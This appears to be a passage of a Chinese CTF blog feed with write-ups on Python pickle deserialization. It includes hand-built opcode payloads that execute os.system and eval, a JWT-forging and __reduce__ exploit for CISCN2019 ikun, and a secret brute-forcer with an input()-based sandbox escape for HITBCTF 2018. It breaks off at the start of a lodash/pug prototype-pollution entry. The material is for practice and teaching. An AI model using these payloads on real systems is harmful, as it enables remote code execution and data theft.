class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">(tRS&#x27;builtins&#x27;</span><br><span class="hljs-string">tRp1</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(g1 </span><br><span class="hljs-string">S&#x27;eval&#x27;</span><br><span class="hljs-string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#g1就是刚才获取到的builtins，我继续使用getattr，获取到了builtins.eval。</span><br></code></pre></div></td></tr></table></figure><p>防御得话可以设置白名单，看一下官方得文档，换成黑名单过滤也行。</p><p><img src="https://www.leavesongs.com/media/attachment/2019/05/27/e016b6fb-d6bd-402b-9f1c-59652fb1b9b4.9ad9519d3512.png" alt="image.png"></p><p>算是在opcode入了个门，但还是挺基础的。</p><p>一些常见得opcode也有现成的，可以参考，但还是多手写熟悉一下。</p><p><a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a></p><figure class="highlight py"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs py">MARK            = <span class="hljs-string">&#x27;(&#x27;</span>   <span class="hljs-comment"># push special markobject on stack</span><br>STOP            = <span class="hljs-string">&#x27;.&#x27;</span>   <span class="hljs-comment"># every pickle ends with STOP</span><br>POP             = <span class="hljs-string">&#x27;0&#x27;</span>   <span class="hljs-comment"># discard topmost stack item</span><br>POP_MARK        = <span class="hljs-string">&#x27;1&#x27;</span>   <span class="hljs-comment"># discard stack top through topmost markobject</span><br>DUP             = <span class="hljs-string">&#x27;2&#x27;</span>   <span class="hljs-comment"># duplicate top stack item</span><br>FLOAT           = <span class="hljs-string">&#x27;F&#x27;</span>   <span class="hljs-comment"># push float object; decimal string argument</span><br>INT             = <span class="hljs-string">&#x27;I&#x27;</span>   <span class="hljs-comment"># push integer or bool; decimal string argument</span><br>BININT          = <span class="hljs-string">&#x27;J&#x27;</span>   <span class="hljs-comment"># push four-byte signed int</span><br>BININT1         = <span class="hljs-string">&#x27;K&#x27;</span>   <span class="hljs-comment"># push 1-byte unsigned int</span><br>LONG            = <span class="hljs-string">&#x27;L&#x27;</span>   <span class="hljs-comment"># push long; decimal string argument</span><br>BININT2         = <span class="hljs-string">&#x27;M&#x27;</span>   <span class="hljs-comment"># push 2-byte unsigned int</span><br>NONE            = <span class="hljs-string">&#x27;N&#x27;</span>   <span class="hljs-comment"># push None</span><br>PERSID          = <span class="hljs-string">&#x27;P&#x27;</span>   <span class="hljs-comment"># push persistent object; id is taken from string arg</span><br>BINPERSID       = <span class="hljs-string">&#x27;Q&#x27;</span>   <span class="hljs-comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br>REDUCE          = <span class="hljs-string">&#x27;R&#x27;</span>   <span class="hljs-comment"># apply callable to argtuple, both on stack</span><br>STRING          = <span class="hljs-string">&#x27;S&#x27;</span>   <span class="hljs-comment"># push string; NL-terminated string argument</span><br>BINSTRING       = <span class="hljs-string">&#x27;T&#x27;</span>   <span class="hljs-comment"># push string; counted binary string argument</span><br>SHORT_BINSTRING = <span class="hljs-string">&#x27;U&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br>UNICODE         = <span class="hljs-string">&#x27;V&#x27;</span>   <span class="hljs-comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span><br>BINUNICODE      = <span class="hljs-string">&#x27;X&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br>APPEND          = <span class="hljs-string">&#x27;a&#x27;</span>   <span class="hljs-comment"># append stack top to list below it</span><br>BUILD           = <span class="hljs-string">&#x27;b&#x27;</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()</span><br>GLOBAL          = <span class="hljs-string">&#x27;c&#x27;</span>   <span class="hljs-comment"># push self.find_class(modname, name); 2 string args</span><br>DICT            = <span class="hljs-string">&#x27;d&#x27;</span>   <span class="hljs-comment"># build a dict from stack items</span><br>EMPTY_DICT      = <span class="hljs-string">&#x27;&#125;&#x27;</span>   <span class="hljs-comment"># push empty dict</span><br>APPENDS         = <span class="hljs-string">&#x27;e&#x27;</span>   <span class="hljs-comment"># extend list on stack by topmost stack slice</span><br>GET             = <span class="hljs-string">&#x27;g&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is string arg</span><br>BINGET          = <span class="hljs-string">&#x27;h&#x27;</span>   <span class="hljs-comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br>INST            = <span class="hljs-string">&#x27;i&#x27;</span>   <span class="hljs-comment"># build &amp; push class instance</span><br>LONG_BINGET     = <span class="hljs-string">&#x27;j&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is 4-byte arg</span><br>LIST            = <span class="hljs-string">&#x27;l&#x27;</span>   <span class="hljs-comment"># build list from topmost stack items</span><br>EMPTY_LIST      = <span class="hljs-string">&#x27;]&#x27;</span>   <span class="hljs-comment"># push empty list</span><br>OBJ             = <span class="hljs-string">&#x27;o&#x27;</span>   <span class="hljs-comment"># build &amp; push class instance</span><br>PUT             = <span class="hljs-string">&#x27;p&#x27;</span>   <span class="hljs-comment"># store stack top in memo; index is string arg</span><br>BINPUT          = <span class="hljs-string">&#x27;q&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br>LONG_BINPUT     = <span class="hljs-string">&#x27;r&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br>SETITEM         = <span class="hljs-string">&#x27;s&#x27;</span>   <span class="hljs-comment"># add key+value pair to dict</span><br>TUPLE           = <span class="hljs-string">&#x27;t&#x27;</span>   <span class="hljs-comment"># build tuple from topmost stack items</span><br>EMPTY_TUPLE     = <span class="hljs-string">&#x27;)&#x27;</span>   <span class="hljs-comment"># push empty tuple</span><br>SETITEMS        = <span class="hljs-string">&#x27;u&#x27;</span>   <span class="hljs-comment"># modify dict by adding topmost key+value pairs</span><br>BINFLOAT        = <span class="hljs-string">&#x27;G&#x27;</span>   <span class="hljs-comment"># push float; arg is 8-byte float encoding</span><br><br>TRUE            = <span class="hljs-string">&#x27;I01\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br>FALSE           = <span class="hljs-string">&#x27;I00\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br><br><span class="hljs-comment"># Protocol 2</span><br><br>PROTO           = <span class="hljs-string">&#x27;\x80&#x27;</span>  <span class="hljs-comment"># identify pickle protocol</span><br>NEWOBJ          = <span class="hljs-string">&#x27;\x81&#x27;</span>  <span class="hljs-comment"># build object by applying cls.__new__ to argtuple</span><br>EXT1            = <span class="hljs-string">&#x27;\x82&#x27;</span>  <span class="hljs-comment"># push object from extension registry; 1-byte index</span><br>EXT2            = <span class="hljs-string">&#x27;\x83&#x27;</span>  <span class="hljs-comment"># ditto, but 2-byte index</span><br>EXT4            = <span class="hljs-string">&#x27;\x84&#x27;</span>  <span class="hljs-comment"># ditto, but 4-byte index</span><br>TUPLE1          = <span class="hljs-string">&#x27;\x85&#x27;</span>  <span class="hljs-comment"># build 1-tuple from stack top</span><br>TUPLE2          = <span class="hljs-string">&#x27;\x86&#x27;</span>  <span class="hljs-comment"># build 2-tuple from two topmost stack items</span><br>TUPLE3          = <span class="hljs-string">&#x27;\x87&#x27;</span>  <span class="hljs-comment"># build 3-tuple from three topmost stack items</span><br>NEWTRUE         = <span class="hljs-string">&#x27;\x88&#x27;</span>  <span class="hljs-comment"># push True</span><br>NEWFALSE        = <span class="hljs-string">&#x27;\x89&#x27;</span>  <span class="hljs-comment"># push False</span><br>LONG1           = <span class="hljs-string">&#x27;\x8a&#x27;</span>  <span class="hljs-comment"># push long from &lt; 256 bytes</span><br>LONG4           = <span class="hljs-string">&#x27;\x8b&#x27;</span>  <span class="hljs-comment"># push really big long</span><br></code></pre></div></td></tr></table></figure><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>考点就是jwt伪造和pickle反序列化</p><p>题目有提示是要找到<code>lv6</code>，写个脚本爆破就行，在<code>page=181</code>发现<code>lv6</code>，但购买数额很大，抓包发现可以改折扣然后会进行一个跳转<code>/b1g_m4mber</code>，</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  requests<br>url = <span class="hljs-string">&#x27;http://6429f3b4-abd3-4051-88e2-a078083710f8.node4.buuoj.cn:81/shop?&#x27;</span><br>s = requests.session()<br>cookie = &#123;<span class="hljs-string">&#x27;UM_distinctid&#x27;</span>:<span class="hljs-string">&#x27;178da808111afb-0cc46980b0aa53-406d2516-1fa400-178da808112649&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    p = url + <span class="hljs-string">&#x27;page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    content = s.get(url=p).text<br>    <span class="hljs-built_in">print</span>(p)<br>    <span class="hljs-comment"># print(content)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> content:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></div></td></tr></table></figure><p>访问需要admin才行，抓包可以看到有cookie中有<code>JWT</code>值，则可以猜想到是伪造<code>jwt</code>，密码爆破出来是<code>1Kun</code></p><p><img src="https://img-blog.csdnimg.cn/eebe3cb51aca470ab7cdc674b2ce86b0.png" alt="在这里插入图片描述"></p><p>以admin登陆后就可以发现源码了。</p><p><img src="https://img-blog.csdnimg.cn/de33790712914320baff419ad4113daf.png" alt="在这里插入图片描述"></p><p>看到源码，是<code>tornado</code>框架，全局搜了一下<code>pickle</code>看到了入口</p><p><img src="https://img-blog.csdnimg.cn/a10e8eb54e644f10a0905768521b37e6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里直接<code>pickle.loads</code>反序列化数据了，没有任何为难。注意这个地方用的是<code>python2</code>写的，有些<code>python3</code>的模块无法导致命令执行。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br>        <span class="hljs-comment"># return (eval,(&quot;\&quot;os.popen(&#x27;ls /&#x27;).read()\&quot;&quot;,))</span><br>        <span class="hljs-comment"># return (commands.getoutput, (&#x27;ls /&#x27;,))</span><br>test = exp()<br>test = pickle.dumps(test,protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(test)<br>p = quote(test)<br><span class="hljs-built_in">print</span>(p)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2894210024f64f87b1d85b541a085df4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这个地方得加上<code>xsrf</code>原因在于在实例化的时候设置了<code>xsrf_cookies=True</code>，并且在模板渲染时还有<code>&#123;% raw xsrf_form_html() %&#125;</code></p><p><img src="https://img-blog.csdnimg.cn/b1b39fad894e44e9a2d13046cb02b2a3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>所以在用<code>post</code>请求时，会在页面中带有<code>xsrf</code>标签，如果没有传入<code>xsrf</code>值则会产生404，使用<code>get</code>，不需要<code>xsrf</code>保护。</p><p><img src="https://img-blog.csdnimg.cn/947635780dcd4a4baee831807f96db2a.png" alt="在这里插入图片描述"></p><p>具体可以参考<a href="https://stackoverflow.com/questions/12890105/tornado-xsrf-argument-missing-from-post/12917054">https://stackoverflow.com/questions/12890105/tornado-xsrf-argument-missing-from-post/12917054</a></p><p>​                       <a href="https://www.tornadoweb.org/en/latest/guide/security.html#cross-site-request-forgery-protection">https://www.tornadoweb.org/en/latest/guide/security.html#cross-site-request-forgery-protection</a></p><h1 id="HITBCTF-2018-Python’s-revenge"><a href="#HITBCTF-2018-Python’s-revenge" class="headerlink" title="HITBCTF 2018 Python’s revenge"></a>HITBCTF 2018 Python’s revenge</h1><p>贴一下源码<a href="https://github.com/p4-team/ctf/tree/master/2018-04-11-hitb-quals/web_python">https://github.com/p4-team/ctf/tree/master/2018-04-11-hitb-quals/web_python</a></p><p>关键代码，重写了<code>loads</code>方法，用了<code>black_type_list </code>白名单过滤，原理就是将<code>unpkler.dispatch[pickle.REDUCE]</code>中使用<code>R</code>操作符弹栈时调用的函数改成了<code>wrapper</code>先进行了一遍检查，绕过了过滤再执行<code>func(*args, **kwargs)</code>返回结果。</p><p><img src="https://img-blog.csdnimg.cn/f713855d70fd450db7ea31489c00738c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>入口在<code>reminder</code>函数，在<code>POST</code>请求时，序列化后用base64编码，然后调用了<code>make_cookie</code>，后面将<code>cookie</code>赋值了。</p><p>​    <img src="https://img-blog.csdnimg.cn/6d67538804e840a88e76cfb3fed295e8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里就只是进行了一下sha256加密，问题时这里的<code>secret</code>不知道，但是源码最开始可以发现<code>cookie_secret</code>在<code>.secret</code>文件中，而且只写入了一次，所以可以用一个加密后的cookie将 <code>secret</code>爆破出来。    </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_cookie</span>(<span class="hljs-params">location, secret</span>):</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;%s!%s&quot;</span> % (calc_digest(location, secret), location)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc_digest</span>(<span class="hljs-params">location, secret</span>):</span><span class="hljs-keyword">return</span> sha256(<span class="hljs-string">&quot;%s%s&quot;</span> % (location, secret)).hexdigest()<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&#x27;.secret&#x27;</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;.secret&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        secret = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits)<br>                         <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>))<br>        f.write(secret)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;.secret&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    cookie_secret = f.read().strip()<br></code></pre></div></td></tr></table></figure><p>用爆破出来的<code>secret</code>结合构造的<code>opcode</code>伪造一个cookie绕过<code>getlocation()</code>的检查。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getlocation</span>():</span><br>    cookie = request.cookies.get(<span class="hljs-string">&#x27;location&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br>    (digest, location) = cookie.split(<span class="hljs-string">&quot;!&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> safe_str_cmp(calc_digest(location, cookie_secret), digest):<br>        flash(<span class="hljs-string">&quot;Hey! This is not a valid cookie! Leave me alone.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    location = loads(b64d(location))<br>    <span class="hljs-keyword">return</span> location<br><br><br><br></code></pre></div></td></tr></table></figure><p>爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> string<br>data = <span class="hljs-string">&#x27;d7e3bd07f7ae389f07abe89d199ebae1e1e67b4479a98870ee5a3c4fe0f56237!VjErMQpwMAou&#x27;</span> <span class="hljs-comment">#拿了个样本</span><br>(calc_digest_result,location) = data.split(<span class="hljs-string">&#x27;!&#x27;</span>)<br>stringlist = string.ascii_letters<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">break_secret</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> stringlist:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> stringlist:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> stringlist:<br>                <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> stringlist:<br>                    data = location + i +j +k +p<br>                    <span class="hljs-keyword">if</span> sha256(data).hexdigest() == calc_digest_result:<br>                        <span class="hljs-built_in">print</span> i +j +k +p<br>                        exit(<span class="hljs-number">1</span>)<br>break_secret()<br><br><span class="hljs-comment">#输出</span><br><span class="hljs-comment">#VjErMQpwMAou d7e3bd07f7ae389f07abe89d199ebae1e1e67b4479a98870ee5a3c4fe0f56237</span><br><span class="hljs-comment">#hitb</span><br></code></pre></div></td></tr></table></figure><blockquote><p>接下来，解决python的沙盒逃逸问题，首先我们要找出一个可以执行命令的函数，这里过滤很很多，但是仔细想想，可以观察到注意到这段代码的一个重要事情 - 它是Python 2，并且在黑名单中没有input（）函数。关于这个函数，python 2和3之间有很大的区别。在python 3中，它的行为与python 2中的raw_input（）相同 ,它只是从stdin读取输入。但在python 2中它所做的实际上是eval（raw_input（）），所以通过使用input（）我们可以做eval（）。input函数在__builtin__ moudle中，于是有：`</p></blockquote><p>这个地方注意input需要从stdin读取数据，则最终构造的payload实际为 </p><p>关于stdin可看<a href="https://www.codenong.com/1450393/">https://www.codenong.com/1450393/</a></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">__builtin__.<span class="hljs-built_in">setattr</span>(__builtin__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>),sysin,cStringIO.StringIO(<span class="hljs-string">&#x27;需要执行的命令&#x27;</span>))<br>__builtin__.<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;python&gt;&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>构造opcode为</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">command_to_eval = raw_input(<span class="hljs-string">&quot;python&gt; &quot;</span>)<br>data = <span class="hljs-string">b&quot;&quot;&quot;c__builtin__</span><br><span class="hljs-string">setattr</span><br><span class="hljs-string">(c__builtin__</span><br><span class="hljs-string">__import__</span><br><span class="hljs-string">(S&#x27;sys&#x27;</span><br><span class="hljs-string">tRS&#x27;stdin&#x27;</span><br><span class="hljs-string">cStringIO</span><br><span class="hljs-string">StringIO</span><br><span class="hljs-string">(S&#x27;&quot;&quot;&quot;</span> +   command_to_eval  +  <span class="hljs-string">&quot;&quot;&quot;&#x27;</span><br><span class="hljs-string">tRtRc__builtin__</span><br><span class="hljs-string">input</span><br><span class="hljs-string">(S&#x27;python&gt;&#x27;</span><br><span class="hljs-string">tR.&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>测试了一下</p><p><img src="https://img-blog.csdnimg.cn/06d2c47ff5be4d378954d78df472a483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后可以输入__import__(‘os’).listdir(“/“)、<strong>import</strong>(‘os’).system(“ls”) 、<strong>import</strong>(‘subprocess’).check_output(“ls”)等进行测试，可以发现根目录下存在flag_is_here,执行open(“/flag_is_here”,”r”).read()，得到：HITB{Py5h0n1st8eBe3tNOW}。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>巅峰极客总结</title>
    <link href="/2021/08/09/2021-8-6-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/08/09/2021-8-6-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2web%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="EZJS"><a href="#EZJS" class="headerlink" title="EZJS"></a>EZJS</h1><p>一点都不ez，看了一下午还是没做出来，感觉要被开了，以前没咋遇到过js的原型链污染，现学了一下原理但还是没找不到链，属实自己的js水平太烂了。</p><p>这里用到的原型链污染原理参考:<a href="https://paper.seebug.org/1426/#_1">https://paper.seebug.org/1426/#_1</a></p><p>pug的rce漏洞原理参考：<a href="https://github.com/pugjs/pug/issues/3312">https://github.com/pugjs/pug/issues/3312</a></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>随便登录后可以在<code>newimg</code>发现文件读取。可以先读取<code>package.json</code>,<code>package-lock.json</code>看看版本。</p><p><img src="https://img-blog.csdnimg.cn/5eda8a13f65c4647acc9b3d120cf2840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>lodash</code>&lt;4.17.17时存在原型链污染漏洞，pug有rce命令执行。看一下<code>index.js</code>源码，核心部分如下。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">router.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  <span class="hljs-comment">//req.session.debug = true;</span><br><br>  <span class="hljs-keyword">if</span> (req.session.username !== <span class="hljs-literal">undefined</span> &amp;&amp; req.session.isadmin !== <span class="hljs-literal">undefined</span>) &#123;<br><br>    <span class="hljs-keyword">if</span> (req.query.newimg !== <span class="hljs-literal">undefined</span>) req.session.img = req.query.newimg;<br><br>    <span class="hljs-keyword">var</span> imgdata = fs.readFileSync(req.session.img? req.session.img: <span class="hljs-string">&quot;./images/1.png&quot;</span>);<br>    <span class="hljs-keyword">var</span> base64data = Buffer.from(imgdata, <span class="hljs-string">&#x27;binary&#x27;</span>).toString(<span class="hljs-string">&#x27;base64&#x27;</span>);<br><br>    <span class="hljs-keyword">var</span> info = &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;我的空间&#x27;</span>, <span class="hljs-attr">msg</span>: req.session.username, <span class="hljs-attr">png</span>: <span class="hljs-string">&quot;data:image/png;base64,&quot;</span> + base64data, <span class="hljs-attr">diy</span>: <span class="hljs-string">&quot;十年磨一剑v0.0.0(尚处于开发版&quot;</span>&#125;;<br><br><br>    <span class="hljs-keyword">if</span> (req.session.isadmin !== <span 